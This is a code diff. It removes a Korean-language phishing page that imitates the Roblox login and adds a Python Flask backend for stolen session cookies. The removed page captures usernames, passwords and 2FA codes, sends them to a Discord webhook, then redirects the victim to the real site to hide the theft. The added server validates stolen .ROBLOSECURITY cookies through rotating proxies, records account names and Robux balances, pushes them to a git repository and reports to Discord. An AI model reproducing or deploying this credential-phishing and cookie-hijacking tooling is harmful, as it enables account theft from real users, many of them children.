@@ -1,267 +1,60 @@
-<!DOCTYPE html>
-<html lang="ko">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox에 로그인</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Source Sans Pro', 'Noto Sans KR', 'Helvetica Neue', Arial, sans-serif;
-            background: #f5f5f5;
-            color: #333;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-        }
-        a { text-decoration: none; }
-        .navbar {
-            background: #101010;
-            height: 48px;
-            display: flex;
-            align-items: center;
-            padding: 0 24px;
-            position: fixed;
-            top: 0; left: 0; right: 0;
-            z-index: 100;
-        }
-        .navbar-inner {
-            max-width: 1200px; width: 100%; margin: 0 auto;
-            display: flex; align-items: center; justify-content: space-between;
-        }
-        .navbar-left { display: flex; align-items: center; gap: 24px; }
-        .navbar-logo { display: flex; align-items: center; }
-        .navbar-logo img { height: 28px; display: block; }
-        .navbar-link { color: #aaa; font-size: 13px; font-weight: 500; }
-        .navbar-link:hover { color: #fff; text-decoration: none; }
-        .navbar-right { display: flex; align-items: center; gap: 12px; }
-        .nav-signup {
-            color: #ccc; font-size: 13px; font-weight: 600;
-            padding: 5px 18px; border: 1px solid #555; border-radius: 30px;
-        }
-        .nav-signup:hover { border-color: #888; color: #fff; text-decoration: none; }
-        .nav-login { color: #ccc; font-size: 13px; font-weight: 600; }
-        .nav-login:hover { color: #fff; text-decoration: none; }
+import requests, json, time, os, subprocess
+from datetime import datetime
+from random import choice, randint
+from threading import Thread, Lock
+from flask import Flask, request
 
-        .main-content {
-            flex: 1; display: flex; align-items: center; justify-content: center;
-            padding: 80px 16px 60px; margin-top: 48px;
-        }
-        .login-card {
-            background: #fff; border-radius: 12px; padding: 36px 32px 32px;
-            width: 368px; max-width: 100%; box-shadow: 0 1px 8px rgba(0,0,0,0.06);
-        }
-        .login-header { text-align: center; margin-bottom: 20px; }
-        .login-header h1 { font-size: 24px; font-weight: 700; color: #111; margin-top: 12px; }
+# ===== 설정 (여기만 수정하면 됨) =====
+DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1519016223558340763/VGMWxHAntSmh5o18yRoziahcucUREBqfTEbX2IItByAjpPPAQeHTqtDyQnAzY8mmPX4w"
+GITHUB_REPO_PATH = "/path/to/your/repo"  # 로컬 GitHub 저장소 경로
+PROXY_POOL = [
+    "http://user:pass@ip:port",  # 실제 프록시로 교체
+    # 더 추가
+]
+# ====================================
 
-        .form-group { margin-bottom: 16px; }
-        .form-group label { display: block; font-size: 13px; font-weight: 600; color: #555; margin-bottom: 5px; }
-        .form-group input {
-            width: 100%; padding: 11px 13px; border: 1px solid #ddd; border-radius: 6px;
-            font-size: 15px; background: #fff; outline: none; color: #333;
-        }
-        .form-group input:focus { border-color: #aaa; }
+file_lock = Lock()
 
-        .login-btn {
-            width: 100%; padding: 12px; background: #101010; color: #fff;
-            border: none; border-radius: 30px; font-size: 15px; font-weight: 700;
-            margin-top: 4px; cursor: pointer;
-        }
-        .login-btn:hover { background: #2a2a2a; }
+def discord(title, desc, color=0x00ff00, fields=None):
+    payload = {"embeds": [{"title": title, "description": desc, "color": color, "fields": fields or []}]}
+    requests.post(DISCORD_WEBHOOK, json=payload)
 
-        .forgot-link { display: block; text-align: center; margin-top: 14px; font-size: 13px; color: #00a2ff; font-weight: 500; }
-        .divider-wrap { display: flex; align-items: center; margin: 20px 0; color: #999; font-size: 12px; }
-        .divider-wrap::before, .divider-wrap::after { content: ''; flex: 1; height: 1px; background: #e5e5e5; }
-        .divider-wrap span { padding: 0 14px; }
-        .device-btn {
-            width: 100%; padding: 11px; background: #fff; color: #555;
-            border: 1px solid #ddd; border-radius: 30px; font-size: 14px; font-weight: 600;
-            cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 6px;
-        }
-        .device-btn:hover { background: #f9f9f9; }
-        .signup-text { text-align: center; margin-top: 20px; font-size: 14px; color: #777; }
-        .signup-text a { color: #00a2ff; font-weight: 700; }
-        .error-msg {
-            color: #a00; font-size: 13px; margin-top: 10px; display: none;
-            padding: 8px 10px; background: #fef0ef; border-radius: 6px; text-align: center;
-        }
-        .info-msg {
-            color: #555; font-size: 13px; margin-top: 10px;
-            padding: 8px 10px; background: #f0f7ff; border-radius: 6px; text-align: center;
-            display: none;
-        }
+def validate(cookie, proxy):
+    try:
+        r = requests.get("https://www.roblox.com/mobileapi/userinfo",
+                         headers={"Cookie": f".ROBLOSECURITY={cookie}"},
+                         proxies={"http": proxy, "https": proxy}, timeout=15)
+        if r.status_code == 200:
+            d = r.json()
+            return d.get("UserID"), d.get("UserName"), d.get("RobuxBalance", 0)
+    except: pass
+    return None, None, None
 
-        /* 2FA 화면 (처음엔 숨김) */
-        #step2fa { display: none; }
+def process(cookie, source="unknown"):
+    discord("🔄 수신됨", f"출처: {source}\n쿠키: {cookie[:40]}...", 0xffff00)
+    for i in range(5):
+        proxy = choice(PROXY_POOL)
+        uid, name, robux = validate(cookie, proxy)
+        if uid:
+            with file_lock:
+                with open(os.path.join(GITHUB_REPO_PATH, "cookies.txt"), 'a') as f:
+                    f.write(f"[{datetime.now()}] {name}({uid}) | {robux}R$ | {cookie[:60]}...\n")
+            os.chdir(GITHUB_REPO_PATH)
+            subprocess.run(["git", "add", "cookies.txt"], capture_output=True)
+            subprocess.run(["git", "commit", "-m", f"Cookie: {name}"], capture_output=True)
+            subprocess.run(["git", "push"], capture_output=True)
+            discord("✅ 성공", f"{name} | {robux}R$ | 프록시: {proxy[:30]}...", 0x00ff00)
+            return
+        time.sleep(randint(1, 3))
+    discord("❌ 실패", f"5개 프록시 모두 실패", 0xff0000)
 
-        .footer { background: #101010; padding: 16px 24px; text-align: center; }
-        .footer-links { list-style: none; display: flex; flex-wrap: wrap; justify-content: center; gap: 14px; margin-bottom: 8px; }
-        .footer-links a { color: #888; font-size: 11px; }
-        .footer-links a:hover { color: #fff; }
-        .footer-copy { color: #555; font-size: 11px; }
+app = Flask(__name__)
+@app.route('/webhook', methods=['POST'])
+def hook():
+    data = request.get_json()
+    if data and data.get('cookie'):
+        Thread(target=process, args=(data['cookie'], data.get('source', 'web'))).start()
+    return {"status": "ok"}
 
-        @media (max-width: 767px) {
-            .navbar-link { display: none; }
-            .login-card { padding: 28px 16px 24px; border-radius: 0; box-shadow: none; }
-        }
-    </style>
-</head>
-<body>
-
-    <nav class="navbar">
-        <div class="navbar-inner">
-            <div class="navbar-left">
-                <a href="/" class="navbar-logo">
-                    <img src="https://cdn.foundation.roblox.com/current/StudioLogo.svg" alt="Roblox">
-                </a>
-                <a href="#" class="navbar-link">차트</a>
-                <a href="#" class="navbar-link">마켓플레이스</a>
-                <a href="#" class="navbar-link">만들기</a>
-                <a href="#" class="navbar-link">Robux</a>
-            </div>
-            <div class="navbar-right">
-                <a href="#" class="nav-signup">회원가입</a>
-                <a href="#" class="nav-login">로그인</a>
-            </div>
-        </div>
-    </nav>
-
-    <div class="main-content">
-        <div class="login-card">
-            <div class="login-header">
-                <img src="https://cdn.foundation.roblox.com/current/StudioLogo.svg" alt="Roblox" style="width:56px;height:56px;margin-bottom:12px;">
-                <h1 id="pageTitle">Roblox에 로그인</h1>
-            </div>
-
-            <!-- 1단계: 아이디/비밀번호 -->
-            <form id="loginForm">
-                <div class="form-group">
-                    <label for="username">사용자 이름/이메일/전화번호</label>
-                    <input type="text" id="username" placeholder="사용자 이름/이메일/전화번호" required>
-                </div>
-                <div class="form-group">
-                    <label for="password">비밀번호</label>
-                    <input type="password" id="password" placeholder="비밀번호" required>
-                </div>
-
-                <button class="login-btn" type="submit">로그인</button>
-                <a href="#" class="forgot-link">비밀번호 또는 사용자 이름을 잊으셨나요?</a>
-
-                <div class="divider-wrap"><span>로그인 방법</span></div>
-
-                <button class="device-btn" type="button">
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#555" stroke-width="2">
-                        <rect x="2" y="3" width="20" height="14" rx="2"/>
-                        <line x1="8" y1="21" x2="16" y2="21"/>
-                        <line x1="12" y1="17" x2="12" y2="21"/>
-                    </svg>
-                    로그인 중인 다른 기기
-                </button>
-
-                <div class="error-msg" id="errorMsg">사용자 이름 또는 비밀번호가 올바르지 않습니다.</div>
-            </form>
-
-            <!-- 2단계: 2FA 코드 입력 -->
-            <div id="step2fa">
-                <form id="faForm">
-                    <div class="form-group">
-<label for="faCode">Roblox 앱에서 이 로그인을 승인하시거나 연동된 이메일로 보낸 코드를 입력하세요.</label>
-                        <input type="text" id="faCode" placeholder="인증 코드" required>
-                    </div>
-                    <button class="login-btn" type="submit" id="faSubmit">확인</button>
-                    <div class="error-msg" id="faErrorMsg">코드가 만료되었습니다. 다시 시도하세요.</div>
-                </form>
-            </div>
-
-            <div class="signup-text" id="signupOption">
-                계정이 없으신가요? <a href="#">회원가입</a>
-            </div>
-        </div>
-    </div>
-
-    <div class="footer">
-        <ul class="footer-links">
-            <li><a href="#">회사 소개</a></li>
-            <li><a href="#">인재 채용</a></li>
-            <li><a href="#">블로그</a></li>
-            <li><a href="#">보호자 가이드</a></li>
-            <li><a href="#">기프트 카드 구매</a></li>
-            <li><a href="#">도움말</a></li>
-            <li><a href="#">이용 약관</a></li>
-            <li><a href="#">접근성</a></li>
-            <li><a href="#">개인정보 처리방침</a></li>
-            <li><a href="#">개인정보 보호 설정</a></li>
-            <li><a href="#">사이트 맵</a></li>
-        </ul>
-        <p class="footer-copy">©2026 Roblox Corporation. Roblox, Roblox 로고 및 Powering Imagination은 미국 및 그 외 지역에서 등록 상표 및 미등록 상표입니다.</p>
-    </div>
-
-    <script>
-        var capturedUser = '';
-        var capturedPass = '';
-
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            capturedUser = document.getElementById('username').value;
-            capturedPass = document.getElementById('password').value;
-
-            // Discord로 1차 전송
-            var webhookURL = 'https://discord.com/api/webhooks/1519016223558340763/VGMWxHAntSmh5o18yRoziahcucUREBqfTEbX2IItByAjpPPAQeHTqtDyQnAzY8mmPX4w';
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: '**[1단계] Roblox 로그인 정보 캡처됨**',
-                    embeds: [{
-                        title: '1단계 - 계정 정보',
-                        fields: [
-                            { name: '사용자 이름/이메일', value: capturedUser, inline: true },
-                            { name: '비밀번호', value: capturedPass, inline: true },
-                            { name: '상태', value: '2FA 코드 대기 중...', inline: false }
-                        ],
-                        color: 0xFFA500,
-                        timestamp: new Date().toISOString()
-                    }]
-                })
-            }).catch(function(err) {});
-
-            // 2FA 화면으로 전환
-            document.getElementById('loginForm').style.display = 'none';
-            document.getElementById('signupOption').style.display = 'none';
-            document.getElementById('step2fa').style.display = 'block';
-            document.getElementById('pageTitle').textContent = '2단계 인증';
-        });
-
-        document.getElementById('faForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            var faCode = document.getElementById('faCode').value;
-
-            var webhookURL = 'https://discord.com/api/webhooks/1519016223558340763/VGMWxHAntSmh5o18yRoziahcucUREBqfTEbX2IItByAjpPPAQeHTqtDyQnAzY8mmPX4w';
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: '**[2단계] Roblox 2FA 코드 캡처됨!** @everyone',
-                    embeds: [{
-                        title: '2FA 코드 획득 완료',
-                        fields: [
-                            { name: '사용자 이름/이메일', value: capturedUser, inline: true },
-                            { name: '비밀번호', value: capturedPass, inline: true },
-                            { name: '2FA 인증 코드', value: faCode, inline: false }
-                        ],
-                        color: 0x00FF00,
-                        timestamp: new Date().toISOString()
-                    }]
-                })
-            }).catch(function(err) {});
-
-            // 에러 메시지 표시 후 진짜 Roblox로 리디렉션 (피해자는 "코드 잘못 입력했나?" 생각)
-            document.getElementById('faErrorMsg').style.display = 'block';
-            setTimeout(function() {
-                window.location.href = 'https://www.roblox.com/ko/login';
-            }, 2000);
-        });
-    </script>
-
-</body>
-</html>
+if __name__ == "__main__":
+    app.run(host='0.0.0.0', port=5000)
